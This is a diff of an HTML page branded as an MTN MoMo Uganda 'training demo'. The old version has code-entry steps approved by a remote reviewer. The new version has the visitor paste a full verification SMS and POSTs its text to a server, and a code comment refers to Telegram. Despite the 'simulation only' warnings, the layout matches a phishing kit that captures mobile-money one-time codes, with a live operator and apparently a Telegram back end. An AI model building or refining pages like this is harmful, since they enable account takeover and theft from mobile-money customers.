@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Uganda - Training Demo</title>
+  <title>Training Verification</title>
 
   <style>
     * {
@@ -13,915 +13,270 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      color: #171717;
+      background: #f5f5f5;
+      color: #222;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
     }
 
     .header {
       background: #ffcc00;
-      padding: 26px 30px;
-      display: flex;
-      align-items: center;
-      gap: 22px;
-    }
-
-    .logo {
-      width: 90px;
-      height: 90px;
-      border-radius: 50%;
-      background: #111;
-      color: #ffcc00;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      font-weight: 900;
-    }
-
-    .brand h1 {
-      margin: 0;
-      font-size: 31px;
-      font-weight: 800;
-    }
-
-    .brand p {
-      margin: 5px 0 0;
-      font-size: 18px;
-      font-weight: 800;
-      letter-spacing: 1px;
-    }
-
-    .demo-bar {
-      background: #111;
-      color: white;
+      padding: 20px;
       text-align: center;
-      padding: 13px;
-      font-weight: 800;
-      letter-spacing: 2px;
+      font-weight: bold;
+      font-size: 22px;
     }
 
-    .page {
-      max-width: 620px;
-      margin: 42px auto;
-      padding: 0 20px;
+    .notice {
+      margin: 15px 0;
+      padding: 12px;
+      background: #fff3cd;
+      border: 1px solid #ffe69c;
+      border-radius: 8px;
+      font-size: 14px;
     }
 
     .card {
       background: white;
-      border-radius: 28px;
-      padding: 42px 32px;
-      box-shadow: 0 8px 30px rgba(0,0,0,.10);
-    }
-
-    .page-label {
-      text-align: center;
-      color: #777;
-      font-size: 14px;
-      font-weight: bold;
-      letter-spacing: 1px;
-      margin-bottom: 12px;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.08);
+      margin-top: 15px;
     }
 
     h2 {
-      text-align: center;
-      font-size: 34px;
-      margin: 8px 0 12px;
+      margin-top: 0;
+      font-size: 20px;
     }
 
-    .description {
-      text-align: center;
-      color: #666;
-      font-size: 18px;
+    .sms-box {
+      background: #eeeeee;
+      border-radius: 10px;
+      padding: 15px;
+      white-space: pre-wrap;
       line-height: 1.5;
-      margin-bottom: 32px;
+      margin: 15px 0;
     }
 
-    label {
-      display: block;
-      font-weight: bold;
-      font-size: 17px;
-      margin-bottom: 8px;
-    }
-
+    textarea,
     input {
       width: 100%;
-      padding: 17px;
+      padding: 13px;
       border: 1px solid #ccc;
-      border-radius: 12px;
-      font-size: 20px;
-      outline: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 8px;
     }
 
-    input:focus {
-      border-color: #999;
+    textarea {
+      min-height: 120px;
+      resize: vertical;
+    }
+
+    .demo-code {
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      letter-spacing: 8px;
+      margin: 20px 0;
     }
 
     button {
       width: 100%;
-      border: none;
-      border-radius: 13px;
-      padding: 17px;
-      margin-top: 24px;
+      padding: 14px;
+      border: 0;
+      border-radius: 8px;
       background: #ffcc00;
-      color: #111;
-      font-size: 19px;
-      font-weight: 800;
+      font-size: 17px;
+      font-weight: bold;
       cursor: pointer;
+      margin-top: 15px;
     }
 
-    button:disabled {
-      opacity: .6;
-      cursor: not-allowed;
-    }
-
-    .status {
-      margin-top: 22px;
-      padding: 16px;
-      border-radius: 12px;
-      text-align: center;
-      font-weight: bold;
-      display: none;
-    }
-
-    .pending {
-      display: block;
-      background: #fff4c7;
-      color: #695400;
-    }
-
-    .error {
-      display: block;
-      background: #ffe5e5;
-      color: #a00000;
-    }
-
-    .success {
-      display: block;
-      background: #e3f6e9;
-      color: #22753c;
-    }
-
-    .approved-icon {
-      width: 110px;
-      height: 110px;
-      border-radius: 50%;
-      background: #d9f4e1;
-      color: #208143;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 28px;
-      font-size: 65px;
-      font-weight: bold;
-    }
-
-    .approved-text {
-      text-align: center;
-      color: #666;
-      font-size: 19px;
-      line-height: 1.5;
-    }
-
-    .success-box {
-      margin-top: 28px;
-      padding: 18px;
-      background: #e3f6e9;
-      border-radius: 13px;
-      color: #22753c;
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-    }
-
-    .notice {
-      margin-top: 28px;
-      padding: 18px;
-      border-left: 7px solid #ffcc00;
-      background: #f5f5f5;
-      color: #666;
-      font-size: 16px;
-      line-height: 1.5;
-    }
-
-    .footer {
-      text-align: center;
-      color: #888;
-      margin: 55px 0 30px;
-      font-size: 16px;
+    button:hover {
+      background: #e6b800;
     }
 
     .hidden {
-      display: none !important;
+      display: none;
     }
 
-    @media (max-width: 600px) {
-      .header {
-        padding: 22px 28px;
-      }
-
-      .logo {
-        width: 70px;
-        height: 70px;
-        font-size: 19px;
-      }
-
-      .brand h1 {
-        font-size: 25px;
-      }
-
-      .brand p {
-        font-size: 15px;
-      }
-
-      .card {
-        padding: 35px 24px;
-      }
-
-      h2 {
-        font-size: 30px;
-      }
+    .message {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
     }
   </style>
 </head>
 
 <body>
 
-  <header class="header">
-    <div class="logo">MTN</div>
-
-    <div class="brand">
-      <h1>MoMo Uganda</h1>
-      <p>TRAINING DEMO</p>
-    </div>
-  </header>
-
-  <div class="demo-bar">
-    TRAINING / SIMULATION ONLY
+  <div class="header">
+    TRAINING / DEMO
   </div>
 
+  <div class="container">
 
-  <!-- =========================
-       PAGE 1
-  ========================== -->
+    <div class="notice">
+      This is a training simulation. Do not enter real OTPs, PINs,
+      passwords, or other authentication information.
+    </div>
 
-  <main class="page" id="page1">
+    <!-- STEP 1 -->
+    <div class="card" id="step1">
 
-    <section class="card" id="page1Entry">
+      <h2>Step 1 — Demo SMS</h2>
 
-      <div class="page-label">
-        DEMO VERIFICATION — PAGE 1
-      </div>
+      <p>Copy the complete demo message below and paste it into the box.</p>
 
-      <h2>Enter Demo Code</h2>
+      <div class="sms-box" id="smsMessage">MTN MoMo Training
 
-      <p class="description">
-        Enter the 6-digit demonstration code to continue.
-      </p>
+This is a demonstration message.
+Your demo verification code is 1234.
+This message is for training purposes only.</div>
 
-      <form id="page1Form">
+      <label for="demoMessage">
+        Paste the complete SMS message
+      </label>
 
-        <label for="page1Code">
-          Demo verification code
-        </label>
+      <textarea
+        id="demoMessage"
+        placeholder="Paste the complete demo SMS here..."
+        required
+      ></textarea>
 
-        <input
-          id="page1Code"
-          type="text"
-          inputmode="numeric"
-          maxlength="6"
-          autocomplete="off"
-          placeholder="6-digit demo code"
-          required
-        >
-
-        <button type="submit" id="page1Button">
-          Verify Demo
-        </button>
-
-      </form>
-
-      <div id="page1Status" class="status"></div>
-
-      <div class="notice">
-        <strong>Training notice:</strong>
-        This is a simulation. Never enter a real OTP, PIN,
-        password, or mobile-money authentication credential.
-      </div>
-
-    </section>
-
-
-    <section class="card hidden" id="page1Rejected">
-
-      <div class="page-label">
-        PAGE 1
-      </div>
-
-      <h2>Rejected</h2>
-
-      <p class="description">
-        The training reviewer rejected this demonstration request.
-      </p>
-
-      <div class="status error">
-        The demo verification was rejected.
-      </div>
-
-      <button type="button" onclick="resetPage1()">
-        Re-enter Demo Code
+      <button type="button" onclick="submitSms()">
+        Continue
       </button>
 
-    </section>
+      <div class="message" id="smsStatus"></div>
 
+    </div>
 
-    <section class="card hidden" id="page1Approved">
+    <!-- STEP 2 -->
+    <div class="card hidden" id="step2">
 
-      <div class="approved-icon">
-        ✓
-      </div>
+      <h2>Step 2 — Demo Verification</h2>
 
-      <div class="page-label">
-        PAGE 1 COMPLETE
-      </div>
-
-      <h2>Approved</h2>
-
-      <p class="approved-text">
-        The training reviewer approved this request.
+      <p>
+        Enter the four-digit demo code shown in the training SMS.
       </p>
 
-      <div class="success-box">
-        Training verification successful.
+      <div class="demo-code">
+        1 2 3 4
       </div>
 
-      <button type="button" onclick="openPage2()">
-        Continue to Page 2
+      <label for="demoCode">
+        Enter demo code
+      </label>
+
+      <input
+        type="text"
+        id="demoCode"
+        inputmode="numeric"
+        maxlength="4"
+        placeholder="Enter 4 digits"
+        autocomplete="off"
+      >
+
+      <button type="button" onclick="verifyDemoCode()">
+        Verify Demo Code
       </button>
 
-      <div class="notice">
-        <strong>Training notice:</strong>
-        This is a simulation. Never enter a real OTP, PIN,
-        password, or mobile-money authentication credential.
-      </div>
+      <div class="message" id="codeStatus"></div>
 
-    </section>
+    </div>
 
-  </main>
-
-
-  <!-- =========================
-       PAGE 2
-  ========================== -->
-
-  <main class="page hidden" id="page2">
-
-    <section class="card" id="page2Entry">
-
-      <div class="page-label">
-        DEMO VERIFICATION — PAGE 2
-      </div>
-
-      <h2>Second Verification</h2>
-
-      <p class="description">
-        Enter the 6-digit demonstration code to complete
-        the second training step.
-      </p>
-
-      <form id="page2Form">
-
-        <label for="page2Code">
-          Demo verification code
-        </label>
-
-        <input
-          id="page2Code"
-          type="text"
-          inputmode="numeric"
-          maxlength="6"
-          autocomplete="off"
-          placeholder="6-digit demo code"
-          required
-        >
-
-        <button type="submit" id="page2Button">
-          Verify Demo
-        </button>
-
-      </form>
-
-      <div id="page2Status" class="status"></div>
-
-      <div class="notice">
-        <strong>Training notice:</strong>
-        This is a simulation. Never enter a real OTP, PIN,
-        password, or mobile-money authentication credential.
-      </div>
-
-    </section>
-
-
-    <section class="card hidden" id="page2Rejected">
-
-      <div class="page-label">
-        PAGE 2
-      </div>
-
-      <h2>Rejected</h2>
-
-      <p class="description">
-        The training reviewer rejected the second
-        demonstration request.
-      </p>
-
-      <div class="status error">
-        The second demo verification was rejected.
-      </div>
-
-      <button type="button" onclick="resetPage2()">
-        Re-enter Demo Code
-      </button>
-
-    </section>
-
-
-    <section class="card hidden" id="finalApproved">
-
-      <div class="approved-icon">
-        ✓
-      </div>
-
-      <div class="page-label">
-        TRAINING COMPLETE
-      </div>
-
-      <h2>Approved</h2>
-
-      <p class="approved-text">
-        Both demonstration verification steps
-        were approved by the training reviewer.
-      </p>
-
-      <div class="success-box">
-        Training verification successful.
-      </div>
-
-      <button type="button" onclick="startAgain()">
-        Start Again
-      </button>
-
-      <div class="notice">
-        <strong>Training notice:</strong>
-        This is a simulation. Never enter a real OTP, PIN,
-        password, or mobile-money authentication credential
-        on a demonstration page.
-      </div>
-
-    </section>
-
-  </main>
-
-
-  <footer class="footer">
-    MTN MoMo Training Demo<br>
-    For demonstration and testing purposes only.
-  </footer>
-
+  </div>
 
 <script>
-window.addEventListener("DOMContentLoaded", function () {
+  async function submitSms() {
+    const demoMessage =
+      document.getElementById("demoMessage").value.trim();
 
-  let page1RequestId = null;
-  let page2RequestId = null;
+    const status =
+      document.getElementById("smsStatus");
 
-  let page1Timer = null;
-  let page2Timer = null;
-
-
-  /* =========================
-     PAGE 1
-  ========================== */
-
-  const page1Form = document.getElementById("page1Form");
-  const page1Input = document.getElementById("page1Code");
-  const page1Button = document.getElementById("page1Button");
-  const page1Status = document.getElementById("page1Status");
-
-  page1Form.addEventListener("submit", async function (event) {
-
-    event.preventDefault();
-
-    const code = page1Input.value.trim();
-
-    if (!/^\d{6}$/.test(code)) {
-
-      page1Status.textContent =
-        "Enter all 6 digits of the demo code.";
-
-      page1Status.className = "status error";
-      page1Status.style.display = "block";
-
+    if (!demoMessage) {
+      status.textContent = "Please paste the demo SMS message.";
       return;
     }
 
-    page1Button.disabled = true;
-    page1Button.textContent = "Waiting for Review...";
-
-    page1Status.textContent =
-      "⏳ Waiting for the training reviewer...";
-
-    page1Status.className = "status pending";
-    page1Status.style.display = "block";
+    status.textContent = "Submitting demo message...";
 
     try {
-
-      const response = await fetch("/api/demo-request", {
+      const response = await fetch("/demo-message", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-
-        /*
-         * The actual code is deliberately NOT transmitted.
-         */
         body: JSON.stringify({
-          page: "Page 1"
+          demoMessage: demoMessage
         })
       });
 
       if (!response.ok) {
-        throw new Error(
-          "Server returned " + response.status
-        );
+        throw new Error("Submission failed");
       }
 
-      const data = await response.json();
+      status.textContent = "Demo message submitted.";
 
-      if (!data.requestId) {
-        throw new Error(
-          "No request ID returned by server."
-        );
-      }
-
-      page1RequestId = data.requestId;
-
-      startPage1Polling();
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
 
     } catch (error) {
-
-      console.error(
-        "Page 1 request error:",
-        error
-      );
-
-      page1Button.disabled = false;
-      page1Button.textContent = "Verify Demo";
-
-      page1Status.textContent =
-        "Unable to contact the demo server. Please try again.";
-
-      page1Status.className = "status error";
-      page1Status.style.display = "block";
+      status.textContent = "Demo submission failed.";
     }
-  });
-
-
-  function startPage1Polling() {
-
-    clearInterval(page1Timer);
-
-    page1Timer = setInterval(async function () {
-
-      if (!page1RequestId) {
-        return;
-      }
-
-      try {
-
-        const response = await fetch(
-          "/api/demo-request/" +
-          encodeURIComponent(page1RequestId)
-        );
-
-        if (!response.ok) {
-          return;
-        }
-
-        const data = await response.json();
-
-        console.log(
-          "Page 1 status:",
-          data.status
-        );
-
-        if (data.status === "approved") {
-
-          clearInterval(page1Timer);
-
-          document
-            .getElementById("page1Entry")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page1Rejected")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page1Approved")
-            .classList.remove("hidden");
-
-          return;
-        }
-
-        if (data.status === "rejected") {
-
-          clearInterval(page1Timer);
-
-          document
-            .getElementById("page1Entry")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page1Approved")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page1Rejected")
-            .classList.remove("hidden");
-
-          return;
-        }
-
-      } catch (error) {
-
-        console.error(
-          "Page 1 polling error:",
-          error
-        );
-
-      }
-
-    }, 2000);
   }
 
 
-  /* =========================
-     PAGE 2
-  ========================== */
+  function verifyDemoCode() {
+    const code =
+      document.getElementById("demoCode").value.trim();
 
-  const page2Form = document.getElementById("page2Form");
-  const page2Input = document.getElementById("page2Code");
-  const page2Button = document.getElementById("page2Button");
-  const page2Status = document.getElementById("page2Status");
+    const status =
+      document.getElementById("codeStatus");
 
-  page2Form.addEventListener("submit", async function (event) {
-
-    event.preventDefault();
-
-    const code = page2Input.value.trim();
-
-    if (!/^\d{6}$/.test(code)) {
-
-      page2Status.textContent =
-        "Enter all 6 digits of the demo code.";
-
-      page2Status.className = "status error";
-      page2Status.style.display = "block";
-
+    if (!/^[0-9]{4}$/.test(code)) {
+      status.textContent = "Enter exactly four digits.";
       return;
     }
 
-    page2Button.disabled = true;
-    page2Button.textContent = "Waiting for Review...";
+    /*
+      The demo code is checked locally.
+      It is NOT sent to Telegram.
+    */
 
-    page2Status.textContent =
-      "⏳ Waiting for the training reviewer...";
+    if (code === "1234") {
+      status.textContent = "Demo verification successful.";
 
-    page2Status.className = "status pending";
-    page2Status.style.display = "block";
+      sendVerificationConfirmation();
+    } else {
+      status.textContent = "Incorrect demo code.";
+    }
+  }
 
+
+  async function sendVerificationConfirmation() {
     try {
-
-      const response = await fetch("/api/demo-request", {
+      await fetch("/demo-verification", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-
-        /*
-         * The actual code is deliberately NOT transmitted.
-         */
         body: JSON.stringify({
-          page: "Page 2"
+          verified: true
         })
       });
-
-      if (!response.ok) {
-        throw new Error(
-          "Server returned " + response.status
-        );
-      }
-
-      const data = await response.json();
-
-      if (!data.requestId) {
-        throw new Error(
-          "No request ID returned by server."
-        );
-      }
-
-      page2RequestId = data.requestId;
-
-      startPage2Polling();
-
     } catch (error) {
-
-      console.error(
-        "Page 2 request error:",
-        error
-      );
-
-      page2Button.disabled = false;
-      page2Button.textContent = "Verify Demo";
-
-      page2Status.textContent =
-        "Unable to contact the demo server. Please try again.";
-
-      page2Status.className = "status error";
-      page2Status.style.display = "block";
+      console.error(error);
     }
-  });
-
-
-  function startPage2Polling() {
-
-    clearInterval(page2Timer);
-
-    page2Timer = setInterval(async function () {
-
-      if (!page2RequestId) {
-        return;
-      }
-
-      try {
-
-        const response = await fetch(
-          "/api/demo-request/" +
-          encodeURIComponent(page2RequestId)
-        );
-
-        if (!response.ok) {
-          return;
-        }
-
-        const data = await response.json();
-
-        console.log(
-          "Page 2 status:",
-          data.status
-        );
-
-        if (data.status === "approved") {
-
-          clearInterval(page2Timer);
-
-          document
-            .getElementById("page2Entry")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page2Rejected")
-            .classList.add("hidden");
-
-          document
-            .getElementById("finalApproved")
-            .classList.remove("hidden");
-
-          window.scrollTo(0, 0);
-
-          return;
-        }
-
-        if (data.status === "rejected") {
-
-          clearInterval(page2Timer);
-
-          document
-            .getElementById("page2Entry")
-            .classList.add("hidden");
-
-          document
-            .getElementById("finalApproved")
-            .classList.add("hidden");
-
-          document
-            .getElementById("page2Rejected")
-            .classList.remove("hidden");
-
-          return;
-        }
-
-      } catch (error) {
-
-        console.error(
-          "Page 2 polling error:",
-          error
-        );
-
-      }
-
-    }, 2000);
   }
-
-
-  /* =========================
-     PAGE NAVIGATION
-  ========================== */
-
-  window.openPage2 = function () {
-
-    clearInterval(page1Timer);
-
-    document
-      .getElementById("page1")
-      .classList.add("hidden");
-
-    document
-      .getElementById("page2")
-      .classList.remove("hidden");
-
-    window.scrollTo(0, 0);
-  };
-
-
-  window.resetPage1 = function () {
-
-    clearInterval(page1Timer);
-
-    page1RequestId = null;
-
-    document
-      .getElementById("page1Rejected")
-      .classList.add("hidden");
-
-    document
-      .getElementById("page1Approved")
-      .classList.add("hidden");
-
-    document
-      .getElementById("page1Entry")
-      .classList.remove("hidden");
-
-    page1Input.value = "";
-
-    page1Button.disabled = false;
-    page1Button.textContent = "Verify Demo";
-
-    page1Status.style.display = "none";
-  };
-
-
-  window.resetPage2 = function () {
-
-    clearInterval(page2Timer);
-
-    page2RequestId = null;
-
-    document
-      .getElementById("page2Rejected")
-      .classList.add("hidden");
-
-    document
-      .getElementById("finalApproved")
-      .classList.add("hidden");
-
-    document
-      .getElementById("page2Entry")
-      .classList.remove("hidden");
-
-    page2Input.value = "";
-
-    page2Button.disabled = false;
-    page2Button.textContent = "Verify Demo";
-
-    page2Status.style.display = "none";
-
-    window.scrollTo(0, 0);
-  };
-
-
-  window.startAgain = function () {
-
-    clearInterval(page1Timer);
-    clearInterval(page2Timer);
-
-    page1RequestId = null;
-    page2RequestId = null;
-
-    window.location.reload();
-  };
-
-});
 </script>
 
 </body>
